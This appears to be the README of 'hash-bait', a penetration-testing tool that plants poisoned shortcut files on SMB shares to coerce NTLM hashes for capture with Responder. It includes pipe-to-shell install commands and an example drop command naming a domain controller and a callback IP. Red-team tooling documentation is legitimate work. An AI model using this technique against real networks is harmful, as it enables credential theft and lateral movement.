# hash-bait

Drop poisoned shortcuts on SMB shares to coerce NTLM hashes

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/cover-dark.svg">
  
</picture>

## Quick start

```powershell
irm https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.ps1 | iex
```

```sh
curl -fsSL https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.sh | sh
```

Preview a drop without writing or uploading anything:

```sh
hash-bait drop -t dc1 -c 10.10.14.7 -s public -u svc-reader -i eth0 --dry-run
```

- **One static binary:** Renders `.url`, `.scf`, and `.xml` bait files, uploads and removes them over a native Rust SMB2/3 stack (no `smbclient`, no Python), and hands off to Responder on Linux.
- **Four subcommands:** `drop`, `clean`, `list`, and `listen`, with `--dry-run` planning on `drop`/`clean`, repeatable `-p` payload selection, and bracketed status tags (`[ok]`, `[!]`, `[x]`, `[i]`) that respect `NO_COLOR`.
- **Local-first:** Talks only to the target SMB host and local Responder process with zero accounts, zero telemetry, and no local staging files unless `--save-local` is set.
- **Authorized testing only:** Built for authorized security testing with explicit written permission; capturing coerced NetNTLM hashes requires a Linux host running Responder.

## Documentation

- [Project page](https://real-fruit-snacks.github.io/hash-bait/)
- [Usage, CLI reference, tested platforms & known issues](docs/USAGE.md)
- [Rewrite analysis & behavior parity](docs/ANALYSIS.md)
- [Changelog](CHANGELOG.md) · [Security](SECURITY.md)

## License

[MIT](LICENSE). For authorized security testing with explicit written permission only. Bundled self-hosted web fonts in `docs/fonts/` are licensed under the [SIL Open Font License 1.1](docs/fonts/OFL.txt).
